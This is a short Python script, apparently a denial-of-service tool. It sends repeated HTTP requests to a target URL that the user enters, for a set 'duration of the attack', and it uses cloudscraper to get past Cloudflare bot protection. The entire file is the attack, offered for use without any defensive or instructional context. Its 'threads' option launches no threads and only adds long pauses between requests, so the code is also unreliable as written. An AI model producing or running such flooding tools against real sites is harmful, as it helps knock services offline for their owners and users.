import time
import requests
from cloudscraper import create_scraper

def http_flood(target, duration, threads):
    start_time = time.time()
    elapsed_time = 0

    while elapsed_time < duration:
        scraper = create_scraper()
        response = scraper.get(target)
        elapsed_time = time.time() - start_time

        if elapsed_time > duration:
            break

        # Limit the number of requests per second based on the threads parameter
        time.sleep(duration / threads)

if __name__ == "__main__":
    target = input("Enter the target URL: ")
    duration = float(input("Enter the duration of the attack in seconds: "))
    threads = int(input("Enter the number of threads: "))

    http_flood(target, duration, threads)